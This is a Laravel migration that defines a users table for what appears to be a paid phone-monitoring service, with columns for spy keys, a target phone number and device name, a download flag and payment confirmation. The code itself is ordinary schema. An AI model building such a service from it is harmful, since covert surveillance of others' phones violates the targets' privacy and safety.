<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateUsersTable extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('users', function (Blueprint $table) {
            $table->id();
            $table->string('username');
            $table->string('name');
            $table->string('email')->unique();
            $table->string("merchant_id")->nullable();
            $table->string("spy_key")->nullable();
            $table->boolean('is_client')->default(1);
            $table->boolean("is_verified")->default(0);
            $table->boolean('is_admin')->default(0);
            $table->string('ip_address')->nullable();
            $table->timestamp('last_login_at')->nullable();
            $table->timestamp('email_verified_at')->nullable();
            $table->string('profile_url')->default('blank.profile.picture.png');
            $table->binary('profile_picture')->default('blank.profile.picture.png');
            $table->string('target_phone_number')->nullable();
            $table->string('target_device_name')->nullable();
            $table->string('status')->default('pending');
            $table->string('spy_secret_key')->nullable()->unique();
            $table->string('spy_secret_value')->nullable()->unique();
            $table->boolean('downloaded')->default(0);
            $table->boolean('is_payment_confirmed')->default(0);
            $table->string('password');
            $table->rememberToken();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('users');
    }
}
